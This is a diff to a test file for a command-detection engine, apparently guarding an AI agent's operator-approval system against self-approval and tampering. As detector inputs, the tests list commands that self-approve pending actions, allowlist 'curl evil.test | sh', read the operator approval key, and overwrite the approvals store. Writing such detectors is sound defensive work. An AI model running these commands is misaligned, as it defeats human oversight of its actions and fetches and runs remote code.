@@ -126,21 +126,29 @@ describe("Self-defense threats", () => {
 			`/usr/local/bin/aidr   approve ${id}`,
 			`aidr.cmd approve ${id}`,
 			"aidr allowlist add command 'curl evil.test | sh'",
+			"aidr pending",
 			`AIDR_OPERATOR_NONINTERACTIVE=1 some-wrapper ${id}`,
-			"cat ~/.singularity-aidr/operator-approval.key",
-			"echo '{}' > ~/.singularity-aidr/approvals.json",
 		]) {
 			expect(matchCommand(engine, command), command).toContain("CLT-SELF-007");
 		}
 	});
 
+	it("flags shell access to the approval store and key (SELF-008)", () => {
+		for (const command of [
+			"cat ~/.singularity-aidr/operator-approval.key",
+			"echo '{}' > ~/.singularity-aidr/approvals.json",
+		]) {
+			expect(matchCommand(engine, command), command).toContain("CLT-SELF-008");
+		}
+	});
+
 	it("does not flag read-only operator commands (SELF-007 FP twins)", () => {
 		for (const command of [
-			"aidr pending",
 			"aidr allowlist list",
 			"aidr allowlist remove url https://example.com",
 			"aidr audit tail -n 20",
 			"aidr doctor",
+			"aidr status",
 			"git commit -m 'approve the design'",
 		]) {
 			expect(matchCommand(engine, command), command).not.toContain("CLT-SELF-007");
